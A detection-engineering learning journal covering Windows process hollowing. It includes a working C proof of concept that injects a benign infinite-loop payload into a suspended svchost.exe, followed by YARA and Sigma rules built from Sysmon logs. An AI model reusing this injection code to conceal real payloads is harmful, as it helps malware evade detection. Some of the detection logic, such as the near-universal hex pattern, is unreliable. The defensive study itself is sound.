# Roadmap V3 - Documentation 9: Monday 6 July 2026
## Summary:
Executed Week 2's Main Iteration (which is the 4th iteration in general) of the Detection Engineering Project which was about Process Hollowing Attacks!

## Documentation:
Week 2's Main Iteration is Process Hollowing! Searching about it, I've learnt that Process Hollowing is a sub-technique of Process Injection where its primary goal is to mask a malicious payload behind the identity of a trusted Windows system binary.

Attackers do this by intercepting the lifecycle of running a program! On Windows, when we run a program, the operating system looks at the PE headers to map out its code, data, and resources into virtual memory. Attackers intercept this lifecycle by:
1. Open a process in a paused state (CREATE_SUSPENDED flag). By doing this, Windows builds the structural framework of the process (like loading DLLs, mapping memory, …) but pauses execution at the initial entry point.
2. The attacker then strips away the legitimate executable code, patches the memory space with a completely different payload, and dynamically alters the  execution register inside the primary thread context.
When this is done and the thread resumes, the OS will execute the malicious code while Task Manager will be showing a legitimate app running.

With Gemini’s help, I made this Proof of Concept code to simulate the attack and make detections to it after:
```c
#include <windows.h>
#include <stdio.h>

// Undocumented Native API function prototype to unmap memory
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

int main() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT context = { 0 };
    
    // Sample shellcode: An infinite loop (\xEB\xFE) to keep the hollowed process active for analysis
    unsigned char payload[] = "\xEB\xFE";
    SIZE_T payloadSize = sizeof(payload);

    printf("[*] Step 1: Spawning target process (svchost.exe) in a SUSPENDED state...\n");
    BOOL success = CreateProcessW(
        L"C:\\Windows\\System32\\svchost.exe", 
        NULL, NULL, NULL, FALSE, 
        CREATE_SUSPENDED, 
        NULL, NULL, &si, &pi
    );

    if (!success) {
        printf("[-] Failed to create process. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Process created. PID: %lu, Thread ID: %lu\n", pi.dwProcessId, pi.dwThreadId);

    // Context flags must specify CONTEXT_FULL to read/write instruction pointers and registers
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &context)) {
        printf("[-] Failed to get thread context.\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[*] Step 2 & 3: Allocating virtual memory in remote process...\n");
    // In this basic shellcode PoC, we skip complete unmapping and allocate a new dedicated execution region
    LPVOID remoteBuffer = VirtualAllocEx(
        pi.hProcess, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    if (remoteBuffer == NULL) {
        printf("[-] Memory allocation failed inside remote process.\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Memory allocated at address: 0x%p\n", remoteBuffer);

    printf("[*] Step 4: Writing malicious payload into target memory space...\n");
    SIZE_T bytesWritten = 0;
    success = WriteProcessMemory(
        pi.hProcess, 
        remoteBuffer, 
        payload, 
        payloadSize, 
        &bytesWritten
    );

    if (!success || bytesWritten != payloadSize) {
        printf("[-] Failed to write payload to target process.\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Successfully wrote %zu bytes to remote memory.\n", bytesWritten);

    printf("[*] Step 5: Hijacking thread execution context...\n");
    // Update the Instruction Pointer (RIP for x64) to point to our newly written shellcode
    context.Rip = (DWORD64)remoteBuffer;

    if (!SetThreadContext(pi.hThread, &context)) {
        printf("[-] Failed to alter thread context.\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[*] Step 6: Resuming hijacked thread...\n");
    ResumeThread(pi.hThread);

    printf("[+] Attack sequence complete. Hollowed process running.\n");

    // Clean up handle allocations
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

Explanation:  
```c STARTUPINFOW si = { sizeof(si) }; ``` initializes a structure that defines how the main window of the created process should appear. Passing its own size inside the first member is a strict requirement for Windows API compatibility.

```c PROCESS_INFORMATION pi = { 0 }; ``` Declares an output structure. When a process spawns successfully, Windows fills this with the target's Process ID (PID), Thread ID, Process Handle, and Thread Handle.

```c CONTEXT context = { 0 }; ``` A very important architecture-specific structure. It holds the current state of processor registers.

```c CreateProcessW(L“C……\\svchost.exe”, …, CREATE_SUSPENDED, …); ``` Instructs the OS to load svchost.exe. The W in CreateProcess is for “Wide”. It’s similar to how I write the keyword “wide” while writing yara rules, it ensures the support of UTF-16LE encoding. CREATE_SUSPENDED is a creation flag, it makes sure that the process will be paused at its entry point.

```c context.ContextFlags = CONTEXT_FULL;``` Tell Windows that we want to read every primary CPU register group controlled by the thread.

```c GetThreadContext(pi.hThread, &context); ``` Queries the suspended thread handle and populates our context structure with the exact register values currently loaded onto the CPU for that thread.

```c VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); ``` Allocates a clean chunk of virtual memory inside the memory boundaries of the victim process.
- MEM_COMMIT | MEM_RESERVE ensures physical memory backing is instantly allocated.
- PAGE_EXECUTE_READWRITE provides read, write and execute permissions.

```c WriteProcessMemory(pi.hProcess, remoteBuffer, payload, payloadSize, &bytesWritten); ``` Copies the raw malicious bytecode payload out of our deployment program memory space and pastes it into the newly allocated remoteBuffer region inside svchost.exe.

```c context.Rip = (DWORD64)remoteBuffer; ``` Overwrites the Instruction Pointer register inside our local context variable, swapping out the legitimate entry address for our malicious memory buffer address.

```c SetThreadContext(pi.hThread, &context); ``` Flushes the altered register values back down into the physical CPU thread context of the suspended process.

```c ResumeThread(pi.hThread); ``` Tells the Windows scheduler that the target thread is ready to run. The CPU looks at the hijacked RIP register, jumps straight to the payload, and executes it inside the context of svchost.exe.

Now, it’s time to make YARA rules. Since these are legitimate Win32 APIs, I believe that developers, admins, security engineers, … might use them in normal work! So I'll tailor my rule to catch a combination of these keywords that make the whole process suspicious and indicates a potential attack! I’m thinking of catching these keywords:  

**1. Main Mandatory Keywords:**
1) **CreateProcessW:** An essential function in the attack! But since it comes from the "CreateProcess" family of functions, I'm making a detection for each version.
2) **CREATE_SUSPENDED:** Since this is a key keyword used in the attack process.
3) **VirtualAllocEx:** All malware of this kind will feature this function since they need to access the virtual memory.
4) **WriteProcessMemory:** Also all malware of this kind will feature this since they have to write the code into the process's memory.
5) **SetThreadContext:** After writing the memory, the malware will point to the malicious thread
6) **ResumeThread:** To make the malicious code run.

**2. Optional Keywords:**
1) **NtUnmapViewOfSection:** It's optional since I found while researching about the attack that attackers don't use this function a lot anymore in modern malware since it gets caught easily. They leave the original code intact, then they instead use VirtualAllocEx to find a different empty section of memory inside the suspended process and write the code there. Then they use SetThreadContext to point the thread execution over to the new location.
2) **GetThreadContext:** Optional because I saw that not all malware read the Thread Context.
3) **CloseHandle:** An attacker might forget to close the handle at the end, so I'm making this optional.

For the condition, I'll ask for all the mandatory, and at least 1 of the optional ones.

the YARA rule:
```yar
rule Process_Hollowing_Indicators {
	meta:
		description = "Catches if a file has enough used keywords that indicates a Process Hollowing Attack"
		date = "06-07-2026"
		sevirity = "High"
	strings:
		// Create Process Versions:
		$api_create = "CreateProcess" ascii wide
		$api_create_a = "CreateProcessA" ascii wide
		$api_create_w = "CreateProcessW" ascii wide

		// Suspend Flag:
		$suspend_flag = "CREATE_SUSPENDED" ascii wide

		// Other Mandatory APIs:
		$api_alloc = "VirtualAllocEx" ascii wide
		$api_write_mem = "WriteProcessMemory" ascii wide
		$api_set_thread = "SetThreadContext" ascii wide
		$api_resume = "ResumeThread" ascii wide

		// Optional Keywords:
		$o_unmap_view = "NtUnmapViewOfSection" ascii wide
		$o_get_thread = "GetThreadContext" ascii wide
		$o_close_handle = "CloseHandle" ascii wide
	condition:
		// Hex(MZ) AND One Create Process version AND All other mandatory keywords AND at least 1 of the optional
		uint16(0) == 0x5A4D and ($api_create or $api_create_a or $api_create_w) and $suspend_flag and $api_alloc and $api_write_mem and $api_set_thread and $api_resume and (1 of ($o_unmap_view, $o_get_thread, $o_close_handle))
}
```

I ran this rule to check the .exe file but detection didn't output anything! I double checked it and didn't see anything wrong with it! So I researched about it and found that I can't use this kind of writing with an exe file since it doesn't contain human readble words anymore, they all got translated to machine code! So I need to make a detection that detects machine code instead. Gemini gave me this YARA rule as an alternative to my existing one:
```yar
import "pe"

rule Process_Hollowing_Indicators {
	meta:
		description = "Detects Process Hollowing via PE import analysis and suspended state flags"
		date = "2026-07-06"
		severity = "High"

	strings:
		// Look for the raw hex representation of the CREATE_SUSPENDED flag (0x00000004)
		// passed as an argument in x86/x64 assembly (e.g., push 0x4 or mov reg, 0x4)
		$create_suspended_bytes = { 04 00 00 00 } 

	condition:
		// 1. Verify it is a Windows PE Executable (MZ Header)
		uint16(0) == 0x5A4D and pe.is_pe and

		// 2. Check the Import Address Table for process creation APIs
		(
			pe.imports("kernel32.dll", "CreateProcessA") or
			pe.imports("kernel32.dll", "CreateProcessW")
		) and

		// 3. Check for the core memory manipulation and thread hijacking APIs
		pe.imports("kernel32.dll", "VirtualAllocEx") and
		pe.imports("kernel32.dll", "WriteProcessMemory") and
		pe.imports("kernel32.dll", "SetThreadContext") and
		pe.imports("kernel32.dll", "ResumeThread") and

		// 4. Look for the execution context or unmapping indicators
		(
			pe.imports("ntdll.dll", "NtUnmapViewOfSection") or
			pe.imports("ntdll.dll", "ZwUnmapViewOfSection") or
			pe.imports("kernel32.dll", "GetThreadContext") or
			$create_suspended_bytes
		)
}
```

And it worked! Since this was a completely new way to write a YARA rule, I spent some time to research and learn about! What I learned is:
1. The new method scans the functional structure of a file instead just text strings.
2. These new conditions cannot be put as string vvariables and reused here since they are literal conditions, so sentences like "pe.imports("kernel32.dll", "CreateProcessA")" can't be put in a string variable! the name of the function can, but not the full sentence. So these must stay in the condition section.
3. the suspended flag was able to stay as a variable since the strings section in a YARA rule supports 3 things:
    - Text Strings
    - Regular Expressions
    - Hexadecimal Bytes (the one we used)

With that done, now it's time to make Sigma rules! I ran the attack to see what logs it generates. I saw 3 logs:  
**Event 1:**
Important data from this event were:
- ID: 1
- `<Data Name='Image'>C:\Users\Snow\Desktop\attack4-proc-holl.exe</Data>`
- `<Data Name='CommandLine'>"C:\Users\Snow\Desktop\attack4-proc-holl.exe"</Data>`
- `<Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>`

**Event 2:**  
Important data from it:
- ID: 1
- `<Data Name='Image'>C:\Windows\System32\svchost.exe</Data>`
- `<Data Name='OriginalFileName'>svchost.exe</Data>`
- `<Data Name='CommandLine'>"C:\Windows\System32\svchost.exe"</Data>`
- `<Data Name='ParentImage'>C:\Users\Snow\Desktop\attack4-proc-holl.exe</Data>`
- `<Data Name='ParentCommandLine'>"C:\Users\Snow\Desktop\attack4-proc-holl.exe"</Data>`

**Event 3:**
Important Data from it:
- ID: 5
- `<Data Name='Image'>C:\Users\Snow\Desktop\attack4-proc-holl.exe</Data>`

This clearly shows the series of actions that happened:
- PowerShell activated the attack EXE
- The attack EXE opened svchose.exe
- The attack EXE closed

Weirdly, Event ID 10 (ProcessAccess) didn't appear as a log event though this attack gained access to a process! I ran the attack multiple times and nothing appeared! After digging into it! Gemini suggested that it is highly likely a Sysmon Configuration problem.

But anyways, even without the 4th event, I can make some rules regarding this attack. I'm thinking about:
- **Event 1:** I don't think making a rule to alert if PowerShell opened an exe is the right call here since many people open EXEs from PowerShell or any commandline.. But I think I can use my previous knowledge that attackers like the Public folder and make the rule to target PowerShell opening an EXE from that folder. From previous iterations, I also learned that other folders are also liked by attackers like AppData and Temp folders, so I can add them too to this rule.
- **Event 2:** This is the main event! I've learnt that svchost.exe only gets opened from services.exe, so I can make a rule that if svchost was opened and the original name of the exe that opened it wasn't Services.exe, make an alert.
- **Event 3:** Not much to do here since it is just a normal process closing event, so I won't make any rules for this.

With that, I made these 2 rules:
```yml
title: CommandLine opening an EXE from Public, Temp, or the AppData Folder
description: Detects when a CommandLine executes an EXE found in the Public/Temp/AppDate folders
date: 06/07/2026
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    ParentImage|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
    Image|contains:
      - '\Users\Public\'
      - '\AppData\'
  condition: selection
level: medium
```

```yml
title: Svchost.exe opened from Invalid Parent
description: Detects when svchost.exe process gets created from a different process than Services.exe
date: 06/07/2026
logsource:
  product: windows
  service: sysmon
detection:
  event_id:
    EventID: 1
  image_name:
    Image|endswith: '\svchost.exe'
  parent_name:
    ParentImage|endswith: '\services.exe'
  condition: event_id and image_name and not parent_name
level: high
```

With that, Week 2's Main iteration (iteration 4) is done!

**Reflection:**  
This was a really good, fun, and rich in knowledge iteration! I learned more about Win32 APIs, modern attackers tactics and behaviors, learned a new improved way to write more sophisticated YARA rules, and then practiced analyzing logs and writing Sigma rules.